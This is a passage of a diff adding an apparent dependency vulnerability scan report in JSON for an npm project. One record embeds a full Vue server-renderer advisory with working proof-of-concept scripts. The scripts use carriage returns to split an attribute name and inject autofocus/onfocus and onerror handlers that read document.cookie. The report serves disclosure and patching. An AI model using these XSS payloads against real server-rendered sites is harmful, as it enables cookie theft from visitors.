+              "EndLine": 8188
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "nanoid@3.3.11",
+          "Name": "nanoid",
+          "Identifier": {
+            "PURL": "pkg:npm/nanoid@3.3.11",
+            "UID": "6813aec6c5ee2539"
+          },
+          "Version": "3.3.11",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 8215,
+              "EndLine": 8232
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "picocolors@1.1.1",
+          "Name": "picocolors",
+          "Identifier": {
+            "PURL": "pkg:npm/picocolors@1.1.1",
+            "UID": "8eda4bde3cfe144d"
+          },
+          "Version": "1.1.1",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 8807,
+              "EndLine": 8812
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "postcss@8.5.6",
+          "Name": "postcss",
+          "Identifier": {
+            "PURL": "pkg:npm/postcss@8.5.6",
+            "UID": "e142556b6deded66"
+          },
+          "Version": "8.5.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "nanoid@3.3.11",
+            "picocolors@1.1.1",
+            "source-map-js@1.2.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 8875,
+              "EndLine": 8903
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "proxy-from-env@1.1.0",
+          "Name": "proxy-from-env",
+          "Identifier": {
+            "PURL": "pkg:npm/proxy-from-env@1.1.0",
+            "UID": "e4c63e398a75978c"
+          },
+          "Version": "1.1.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 9659,
+              "EndLine": 9664
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "querystringify@2.2.0",
+          "Name": "querystringify",
+          "Identifier": {
+            "PURL": "pkg:npm/querystringify@2.2.0",
+            "UID": "8d55d3f86b3ec021"
+          },
+          "Version": "2.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 9709,
+              "EndLine": 9714
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "requires-port@1.0.0",
+          "Name": "requires-port",
+          "Identifier": {
+            "PURL": "pkg:npm/requires-port@1.0.0",
+            "UID": "44c82ed7cc364116"
+          },
+          "Version": "1.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 9969,
+              "EndLine": 9974
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "safe-buffer@5.2.1",
+          "Name": "safe-buffer",
+          "Identifier": {
+            "PURL": "pkg:npm/safe-buffer@5.2.1",
+            "UID": "e1b866bc428afb54"
+          },
+          "Version": "5.2.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 10082,
+              "EndLine": 10101
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "source-map-js@1.2.1",
+          "Name": "source-map-js",
+          "Identifier": {
+            "PURL": "pkg:npm/source-map-js@1.2.1",
+            "UID": "dee32b591d281e9a"
+          },
+          "Version": "1.2.1",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 10573,
+              "EndLine": 10581
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "url-parse@1.5.10",
+          "Name": "url-parse",
+          "Identifier": {
+            "PURL": "pkg:npm/url-parse@1.5.10",
+            "UID": "18fcef56ab54c6c6"
+          },
+          "Version": "1.5.10",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "querystringify@2.2.0",
+            "requires-port@1.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 11346,
+              "EndLine": 11355
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "vue-demi@0.14.10",
+          "Name": "vue-demi",
+          "Identifier": {
+            "PURL": "pkg:npm/vue-demi@0.14.10",
+            "UID": "ce7c85c02a0a4efe"
+          },
+          "Version": "0.14.10",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "vue@3.5.22"
+          ],
+          "Locations": [
+            {
+              "StartLine": 11440,
+              "EndLine": 11465
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "websocket-driver@0.7.4",
+          "Name": "websocket-driver",
+          "Identifier": {
+            "PURL": "pkg:npm/websocket-driver@0.7.4",
+            "UID": "61f00f1405ecb601"
+          },
+          "Version": "0.7.4",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "http-parser-js@0.5.10",
+            "safe-buffer@5.2.1",
+            "websocket-extensions@0.1.4"
+          ],
+          "Locations": [
+            {
+              "StartLine": 12104,
+              "EndLine": 12117
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "websocket-extensions@0.1.4",
+          "Name": "websocket-extensions",
+          "Identifier": {
+            "PURL": "pkg:npm/websocket-extensions@0.1.4",
+            "UID": "5ad273babbbc34cc"
+          },
+          "Version": "0.1.4",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 12118,
+              "EndLine": 12126
+            }
+          ],
+          "AnalyzedBy": "npm"
+        }
+      ],
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "GHSA-g2v6-rqmx-r4w6",
+          "PkgID": "@vue/server-renderer@3.5.22",
+          "PkgName": "@vue/server-renderer",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/%40vue/server-renderer@3.5.22",
+            "UID": "f6bd0319f0bda45d"
+          },
+          "InstalledVersion": "3.5.22",
+          "FixedVersion": "3.5.42, 3.6.0-rc.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-g2v6-rqmx-r4w6",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:014259ce2fb0b3c846f7538f2d8400e712fb385576e5c0b9102303ce2d05c2ae",
+          "Title": "@vue/server-renderer: XSS via missing CR in attribute-name blacklist",
+          "Description": "## Description\n\n`@vue/server-renderer` was investigated specifically because it's the one place in Vue where template rendering output becomes a real HTTP response body -- a genuine server-side trust boundary, unlike client-side rendering which only ever affects the same browser session that's already running the app's own JS.\n\n`ssrRenderAttrs()` (in `packages/server-renderer/src/helpers/ssrRenderAttrs.ts`) is what compiled SSR output calls for something like `\u003cdiv v-bind=\"userObject\"\u003e`. It loops over the object's own keys and, for each one, renders it as an HTML attribute:\n\n```ts\nexport function ssrRenderDynamicAttr(\n  key: string,\n  value: unknown,\n  tag?: string,\n): string {\n  if (!isRenderableAttrValue(value)) {\n    return ``\n  }\n  const attrKey = ...\n  if (isBooleanAttr(attrKey) || ...) {\n    return includeBooleanAttr(value) ? ` ${attrKey}` : ``\n  } else if (isSSRSafeAttrName(attrKey)) {\n    return value === '' ? ` ${attrKey}` : ` ${attrKey}=\"${escapeHtml(value)}\"`\n  } else {\n    console.warn(`[@vue/server-renderer] Skipped rendering unsafe attribute name: ${attrKey}`)\n    return ``\n  }\n}\n```\n\nThe value always goes through `escapeHtml()` -- that part is correctly and consistently applied everywhere in this file. But the attribute name (`attrKey`) is only checked against a character blacklist, then spliced directly into the output with no escaping of its own:\n\n```ts\n// packages/shared/src/domAttrConfig.ts\nconst unsafeAttrCharRE = /[\u003e/=\"'\\u0009\\u000a\\u000c\\u0020]/\n\nexport function isSSRSafeAttrName(name: string): boolean {\n  if (attrValidationCache.hasOwnProperty(name)) {\n    return attrValidationCache[name]\n  }\n  const isUnsafe = unsafeAttrCharRE.test(name)\n  if (isUnsafe) {\n    console.error(`unsafe attribute name: ${name}`)\n  }\n  return (attrValidationCache[name] = !isUnsafe)\n}\n```\n\nThat blacklist covers: `\u003e`, `/`, `=`, `\"`, apostrophe, tab (U+0009), line feed (U+000A), form feed (U+000C), and space (U+0020). It does not cover U+000D -- carriage return (CR, written as `\\r` in JS).\n\nThat matters because of how browsers actually parse HTML. Per the WHATWG HTML parsing spec, the very first step (\"preprocessing the input stream\") converts every `\\r` not followed by `\\n` into a `\\n` before the tokenizer even starts. So a raw `\\r` sitting inside what Vue intends as a single attribute name gets turned into a real line feed by the browser -- and a line feed is one of the characters that terminates an attribute name and starts a new one. The blacklist checks the string as Vue sees it before the browser gets to reinterpret it, and that's exactly the gap.\n\nBelow is a fresh clone of this repo, confirming the exact commit, the exact vulnerable line, and zero modification to the source:\n\n\u003cimg width=\"781\" height=\"336\" alt=\"poc1\" src=\"https://github.com/user-attachments/assets/f4b92955-9a8f-4700-8c51-38ee46912de8\" /\u003e\n\n## Prrof\n\nThe real, unmodified  ssrRenderAttrs()  from the published  @vue/server-renderer@3.5.41  package was tested. The source at HEAD and the upcoming  v3.6.0-rc.2  tag were also checked, and the same vulnerable regular expression was present in both; no branch containing a fix was identified.\n\nFull script, saved as `poc.mjs` (GitHub doesn't let me attach `.mjs` directly, so the complete file is here):\n\n```js\nimport { ssrRenderAttrs } from '@vue/server-renderer';\nimport { parseFragment } from 'parse5';\n\n// This is exactly what compiled SSR output calls for `\u003cdiv v-bind=\"userObject\"\u003e`\n// -- the real, unmodified, published ssrRenderAttrs function.\n// Full attack chain: the key itself contains ONLY letters, digits, and a\n// bare \\r (carriage return) -- no '\u003e', '/', '=', '\"', \"'\", tab, LF, FF, or\n// space anywhere, so isSSRSafeAttrName() considers it fully safe. The value\n// is attacker-controlled JavaScript, delivered as the genuine value of the\n// LAST \\r-separated fragment, which Vue's own template naturally appends via\n// `=\"${escapeHtml(value)}\"` immediately after the key.\nconst maliciousKey = 'x\\rautofocus\\ronfocus';\nconst props = {\n  [maliciousKey]: 'alert(document.cookie)',\n};\n\nconst rawAttrString = ssrRenderAttrs(props);\nconsole.log('=== Raw string produced by the real ssrRenderAttrs() ===');\nconsole.log(JSON.stringify(rawAttrString));\nconsole.log();\nconsole.log('=== As it would literally appear in the HTML response ===');\nconsole.log(rawAttrString.replace(/\\r/g, '\\\\r').replace(/\\n/g, '\\\\n\\n'));\n\nconst fullHtml = `\u003cdiv${rawAttrString}\u003econtent\u003c/div\u003e`;\nconsole.log();\nconsole.log('=== Full element HTML ===');\nconsole.log(JSON.stringify(fullHtml));\n\n// Now parse this EXACT output with parse5 -- a real, spec-compliant HTML5\n// parser (the same parsing algorithm real browsers implement, including the\n// \\r\\n -\u003e \\n input-preprocessing normalization step).\nconst fragment = parseFragment(fullHtml);\nconst div = fragment.childNodes.find(n =\u003e n.tagName === 'div');\nconsole.log();\nconsole.log('=== How a real HTML5 parser (parse5) actually interprets this ===');\nconsole.log('Attributes parsed on the \u003cdiv\u003e:');\nfor (const attr of div.attrs) {\n  console.log(`  ${JSON.stringify(attr.name)} = ${JSON.stringify(attr.value)}`);\n}\n\nconst injectedHandler = div.attrs.find(a =\u003e a.name === 'onfocus');\nconst injectedAutofocus = div.attrs.find(a =\u003e a.name === 'autofocus');\nconsole.log();\nif (injectedHandler \u0026\u0026 injectedAutofocus) {\n  console.log('*** CONFIRMED: real, separate \"autofocus\" and \"onfocus\" attributes were parsed out ***');\n  console.log(`*** onfocus value: ${JSON.stringify(injectedHandler.value)} ***`);\n  console.log('*** This element will execute the attacker JS automatically on page load, no user interaction needed. ***');\n} else {\n  console.log('Not confirmed.');\n}\n```\n\nThis is a fresh `npm install vue@3.5.41 @vue/server-renderer@3.5.41 parse5` -- the real, currently-published packages, not anything modified:\n\n\u003cimg width=\"831\" height=\"531\" alt=\"poc2\" src=\"https://github.com/user-attachments/assets/ea350948-4c93-45a3-b21a-f21dc7f90d29\" /\u003e\n\nReal, captured output:\n\n```\n=== Raw string produced by the real ssrRenderAttrs() ===\n\" x\\rautofocus\\ronfocus=\\\"alert(document.cookie)\\\"\"\n\n=== Full element HTML ===\n\"\u003cdiv x\\rautofocus\\ronfocus=\\\"alert(document.cookie)\\\"\u003econtent\u003c/div\u003e\"\n\n=== How a real HTML5 parser (parse5) actually interprets this ===\nAttributes parsed on the \u003cdiv\u003e:\n  \"x\" = \"\"\n  \"autofocus\" = \"\"\n  \"onfocus\" = \"alert(document.cookie)\"\n\n*** CONFIRMED: real, separate \"autofocus\" and \"onfocus\" attributes were parsed out ***\n*** onfocus value: \"alert(document.cookie)\" ***\n```\n\n\u003cimg width=\"834\" height=\"897\" alt=\"poc3\" src=\"https://github.com/user-attachments/assets/a92f9c5b-e30d-4968-9ec1-8969628c6437\" /\u003e\n\u003cimg width=\"834\" height=\"896\" alt=\"poc4\" src=\"https://github.com/user-attachments/assets/a397cd3f-8eb3-49af-9604-a31a8bcdb2ea\" /\u003e\n\nThe single attribute name Vue intended to render safely -- `x\\rautofocus\\ronfocus` -- gets parsed by any real browser as three separate things: an empty `x` attribute, a real `autofocus` boolean attribute, and a real `onfocus=\"alert(document.cookie)\"` event handler. `autofocus` means the element receives focus automatically on page load, which fires the `focus` event immediately, which runs the injected JavaScript -- no click, no hover, no user interaction of any kind required.\n\nThis behavior was confirmed not to be specific to the payload by first isolating the mechanism with a minimal case (`\"foo\\rbar\"` as the key, no other special characters at all), which parse5 also split into two genuine separate attributes (`foo=\"\"` and `bar=\"...\"`), before building the full self-triggering payload above.\n\nTo go beyond the parser-level proof, there is a second script that calls the real `ssrRenderAttrs()`, captures its exact return value programmatically, and writes that unmodified byte sequence directly into an HTML file on disk -- no HTML was hand-typed anywhere in this step. Full script, saved as `generate_real_poc.mjs`:\n\n```js\nimport { ssrRenderAttrs } from '@vue/server-renderer';\nimport fs from 'fs';\n\n// This is the ACTUAL, unmodified ssrRenderAttrs() from the real, installed\n// @vue/server-renderer@3.5.41 -- nothing hand-typed below this line is HTML,\n// it is Vue's own function's real return value, captured programmatically.\nconst maliciousKey = 'x\\rsrc\\ronerror';\nconst props = { [maliciousKey]: 'alert(\"REAL Vue SSR output executed this -- cookie: \" + document.cookie)' };\n\nconst vueOutput = ssrRenderAttrs(props);\n\nconsole.log('=== Vue\\'s real ssrRenderAttrs() returned exactly this string ===');\nconsole.log(JSON.stringify(vueOutput));\n\n// Build the full page around Vue's UNMODIFIED output -- the \u003cimg ...\u003e tag\n// content between the angle brackets is copied byte-for-byte from vueOutput,\n// not retyped.\nconst html = `\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\u003ctitle\u003eVue SSR PoC -- byte-for-byte Vue output\u003c/title\u003e\u003c/head\u003e\n\u003cbody\u003e\n\u003ch3\u003eEverything inside the \u0026lt;img\u0026gt; tag below was written to this file\nprogrammatically from the real return value of \u003ccode\u003essrRenderAttrs()\u003c/code\u003e\nin the actual installed \u003ccode\u003e@vue/server-renderer@3.5.41\u003c/code\u003e package.\nNo HTML was hand-typed for the tag itself.\u003c/h3\u003e\n\u003cp\u003eExact JSON-escaped string Vue's function returned (see generate_real_poc.mjs, run right before this file was written):\u003c/p\u003e\n\u003cpre id=\"vue-output-proof\"\u003e${vueOutput.replace(/\u003c/g, '\u0026lt;')}\u003c/pre\u003e\n\u003chr\u003e\n\u003cimg${vueOutput}\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n`;\n\nconst outPath = '/Users/onevilx/Desktop/vue-ssr-xss-poc-real.html';\nfs.writeFileSync(outPath, html);\nconsole.log('\\nWrote', outPath);\nconsole.log('Bytes inside the \u003cimg...\u003e tag are Vue\\'s real, unmodified return value.');\n```\n\nOpening that generated file in a real browser fires the payload automatically:\n\n\u003cimg width=\"1666\" height=\"449\" alt=\"poc5\" src=\"https://github.com/user-attachments/assets/251bd830-634f-4cd0-bf79-849bbc07ec9a\" /\u003e\n\nDev tools on that same page confirm the browser genuinely parsed three separate attributes (`x`, `src`, `onerror`), matching the on-page proof text that was written directly from Vue's real return value:\n\n\u003cimg width=\"1348\" height=\"400\" alt=\"poc6\" src=\"https://github.com/user-attachments/assets/b19d6ff0-ecaa-45f3-9149-9f3d0d4faacb\" /\u003e\n\nWhether this affects client-side (non-SSR) Vue rendering was also checked: it doesn't, and I want to be upfront about that limit too. Client-side Vue sets dynamic attributes via the DOM `setAttribute()` API, which validates the name against the HTML QName grammar and throws a `DOMException` for characters like `\"` (I found an existing, unrelated open issue -- #13944 -- that confirms this behavior). That's a fundamentally different code path with its own validation, and I have not found a way to reach this specific bug through it. This is specifically and only an `@vue/server-renderer` (SSR) issue.\n\n## Impact\n\nThis requires an application to bind an object whose keys (not just values) come from a source the developer doesn't fully control, via `v-bind=\"object\"` or the equivalent compiled form. I want to be honest about how common that is: binding untrusted values into attributes is the standard, everyday Vue pattern that's already safely handled by `escapeHtml()`. Binding untrusted keys is less universal, but it's a real, documented, supported Vue feature, not a misuse of the framework -- and it's exactly the scenario `isSSRSafeAttrName()` exists to defend, which tells me it's already inside your own threat model for this file, just not fully closed. Realistic examples: a CMS or form-builder feature where field/attribute names are configurable by a less-trusted role and gets rendered via SSR to other users; a component that spreads a validated-elsewhere config object onto a root element; any dynamic-attributes helper that takes a plain object where both keys and values may originate from external data (a database record, an API response, a query string parsed into an object).\n\nWhere it's reachable, the impact is a complete, self-triggering stored XSS in server-rendered HTML -- the injected `autofocus`/`onfocus` payload runs the moment the page loads, for every visitor who receives that server-rendered output, with no interaction needed. That's a real trust-boundary break in a security-relevant helper whose entire job is making data safe to render.\n\n## Suggested fix\n\nAdd U+000D (carriage return) to `unsafeAttrCharRE` in `packages/shared/src/domAttrConfig.ts`:\n\n```ts\nconst unsafeAttrCharRE = /[\u003e/=\"'\\u0009\\u000a\\u000c\\u000d\\u0020]/\n```\n\nDouble-checking against the full WHATWG \"ASCII whitespace\" definition (tab, LF, FF, CR, space -- all five) rather than enumerating characters one at a time would help, since that's exactly the kind of list that's easy to leave a gap in, which is what happened here.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+              "V3Score": 7.2
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-g2v6-rqmx-r4w6",
+            "https://github.com/advisories/GHSA-g2v6-rqmx-r4w6",
+            "https://github.com/vuejs/core",
+            "https://github.com/vuejs/core/commit/a2b40db9a83b36ed9da3a16403cf8f040262d73f",
+            "https://github.com/vuejs/core/pull/15266",
+            "https://github.com/vuejs/core/releases/tag/v3.5.42",
+            "https://github.com/vuejs/core/releases/tag/v3.6.0-rc.6",
+            "https://github.com/vuejs/core/security/advisories/GHSA-g2v6-rqmx-r4w6"
+          ],
+          "PublishedDate": "2026-10-05T22:50:55Z",
+          "LastModifiedDate": "2026-10-05T22:50:55Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-25639",
+          "VendorIDs": [
+            "GHSA-43fc-jf86-j433"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.13.5, 0.30.3",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-25639",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:86890acc1fee2618d716196449efc7fd00f97031b0ee106bc9ea63f5f095082d",
+          "Title": "axios: Axios affected by Denial of Service via __proto__ Key in mergeConfig",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to versions 0.30.3 and 1.13.5, the mergeConfig function in axios crashes with a TypeError when processing configuration objects containing __proto__ as an own property. An attacker can trigger this by providing a malicious configuration object created via JSON.parse(), causing complete denial of service. This vulnerability is fixed in versions 0.30.3 and 1.13.5.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-754",
+            "CWE-1287"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:10184",
+            "https://access.redhat.com/errata/RHSA-2026:11414",
+            "https://access.redhat.com/errata/RHSA-2026:13542",
+            "https://access.redhat.com/errata/RHSA-2026:13548",
+            "https://access.redhat.com/errata/RHSA-2026:19712",
+            "https://access.redhat.com/errata/RHSA-2026:25041",
+            "https://access.redhat.com/errata/RHSA-2026:2694",
+            "https://access.redhat.com/errata/RHSA-2026:3087",
+            "https://access.redhat.com/errata/RHSA-2026:3105",
+            "https://access.redhat.com/errata/RHSA-2026:3106",
+            "https://access.redhat.com/errata/RHSA-2026:3107",
+            "https://access.redhat.com/errata/RHSA-2026:3109",
+            "https://access.redhat.com/errata/RHSA-2026:36882",
+            "https://access.redhat.com/errata/RHSA-2026:41064",
+            "https://access.redhat.com/errata/RHSA-2026:4942",
+            "https://access.redhat.com/errata/RHSA-2026:5142",
+            "https://access.redhat.com/errata/RHSA-2026:5168",
+            "https://access.redhat.com/errata/RHSA-2026:5174",
+            "https://access.redhat.com/errata/RHSA-2026:5633",
+            "https://access.redhat.com/errata/RHSA-2026:5636",
+            "https://access.redhat.com/errata/RHSA-2026:5665",
+            "https://access.redhat.com/errata/RHSA-2026:5807",
+            "https://access.redhat.com/errata/RHSA-2026:6170",
+            "https://access.redhat.com/errata/RHSA-2026:6174",
+            "https://access.redhat.com/errata/RHSA-2026:6192",
+            "https://access.redhat.com/errata/RHSA-2026:6277",
+            "https://access.redhat.com/errata/RHSA-2026:6308",
+            "https://access.redhat.com/errata/RHSA-2026:6309",
+            "https://access.redhat.com/errata/RHSA-2026:6428",
+            "https://access.redhat.com/errata/RHSA-2026:6497",
+            "https://access.redhat.com/errata/RHSA-2026:6567",
+            "https://access.redhat.com/errata/RHSA-2026:6568",
+            "https://access.redhat.com/errata/RHSA-2026:6802",
+            "https://access.redhat.com/errata/RHSA-2026:7249",
+            "https://access.redhat.com/errata/RHSA-2026:8218",
+            "https://access.redhat.com/errata/RHSA-2026:8229",
+            "https://access.redhat.com/errata/RHSA-2026:8499",
+            "https://access.redhat.com/errata/RHSA-2026:8500",
+            "https://access.redhat.com/errata/RHSA-2026:8501",
+            "https://access.redhat.com/errata/RHSA-2026:9848",
+            "https://access.redhat.com/security/cve/CVE-2026-25639",
+            "https://advisory.echohq.com/cve/CVE-2026-25639",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2438237",
+            "https://github.com/advisories/GHSA-43fc-jf86-j433",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/commit/28c721588c7a77e7503d0a434e016f852c597b57",
+            "https://github.com/axios/axios/commit/d7ff1409c68168d3057fc3891f911b2b92616f9e",
+            "https://github.com/axios/axios/pull/7369",
+            "https://github.com/axios/axios/pull/7388",
+            "https://github.com/axios/axios/releases/tag/v0.30.3",
+            "https://github.com/axios/axios/releases/tag/v1.13.5",
+            "https://github.com/axios/axios/security/advisories/GHSA-43fc-jf86-j433",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-25639",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-25639.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-25639"
+          ],
+          "PublishedDate": "2026-02-09T21:15:49.01Z",
+          "LastModifiedDate": "2026-09-10T13:17:46Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42033",
+          "VendorIDs": [
+            "GHSA-pf86-5x62-jrwf"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.15.1, 0.31.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42033",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:99925da90bfd762ed322434bbbf2cf713fabeb8ee20f15dca2aab893fd37f89b",
+          "Title": "axios: Axios: HTTP Transport Hijacking via Prototype Pollution",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, when Object.prototype has been polluted by any co-dependency with keys that axios reads without a hasOwnProperty guard, an attacker can (a) silently intercept and modify every JSON response before the application sees it, or (b) fully hijack the underlying HTTP transport, gaining access to request credentials, headers, and body. The precondition is prototype pollution from a separate source in the same process. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1321",
+            "CWE-915"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:14937",
+            "https://access.redhat.com/errata/RHSA-2026:16476",
+            "https://access.redhat.com/errata/RHSA-2026:16532",
+            "https://access.redhat.com/errata/RHSA-2026:16534",
+            "https://access.redhat.com/errata/RHSA-2026:16535",
+            "https://access.redhat.com/errata/RHSA-2026:16542",
+            "https://access.redhat.com/errata/RHSA-2026:16874",
+            "https://access.redhat.com/errata/RHSA-2026:17468",
+            "https://access.redhat.com/errata/RHSA-2026:17474",
+            "https://access.redhat.com/errata/RHSA-2026:17657",
+            "https://access.redhat.com/errata/RHSA-2026:17699",
+            "https://access.redhat.com/errata/RHSA-2026:19109",
+            "https://access.redhat.com/errata/RHSA-2026:19375",
+            "https://access.redhat.com/errata/RHSA-2026:20889",
+            "https://access.redhat.com/errata/RHSA-2026:20938",
+            "https://access.redhat.com/errata/RHSA-2026:21017",
+            "https://access.redhat.com/errata/RHSA-2026:21338",
+            "https://access.redhat.com/errata/RHSA-2026:21772",
+            "https://access.redhat.com/errata/RHSA-2026:22465",
+            "https://access.redhat.com/errata/RHSA-2026:22619",
+            "https://access.redhat.com/errata/RHSA-2026:22629",
+            "https://access.redhat.com/errata/RHSA-2026:22840",
+            "https://access.redhat.com/errata/RHSA-2026:23361",
+            "https://access.redhat.com/errata/RHSA-2026:24536",
+            "https://access.redhat.com/errata/RHSA-2026:24539",
+            "https://access.redhat.com/errata/RHSA-2026:24853",
+            "https://access.redhat.com/errata/RHSA-2026:24977",
+            "https://access.redhat.com/errata/RHSA-2026:25041",
+            "https://access.redhat.com/errata/RHSA-2026:25089",
+            "https://access.redhat.com/errata/RHSA-2026:25271",
+            "https://access.redhat.com/errata/RHSA-2026:25273",
+            "https://access.redhat.com/errata/RHSA-2026:26214",
+            "https://access.redhat.com/errata/RHSA-2026:26225",
+            "https://access.redhat.com/errata/RHSA-2026:26232",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:36882",
+            "https://access.redhat.com/errata/RHSA-2026:48670",
+            "https://access.redhat.com/security/cve/CVE-2026-42033",
+            "https://advisory.echohq.com/cve/CVE-2026-42033",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2461607",
+            "https://github.com/advisories/GHSA-pf86-5x62-jrwf",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/security/advisories/GHSA-pf86-5x62-jrwf",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-42033",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42033.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-42033"
+          ],
+          "PublishedDate": "2026-04-24T18:16:29.993Z",
+          "LastModifiedDate": "2026-09-10T13:20:03.087Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-42035",
+          "VendorIDs": [
+            "GHSA-6chq-wfr3-2hj9"
+          ],
+          "PkgID": "axios@1.12.2",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@1.12.2",
+            "UID": "cdc2f09e371f2a70"
+          },
+          "InstalledVersion": "1.12.2",
+          "FixedVersion": "1.15.1, 0.31.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42035",
+          "DataSource": {
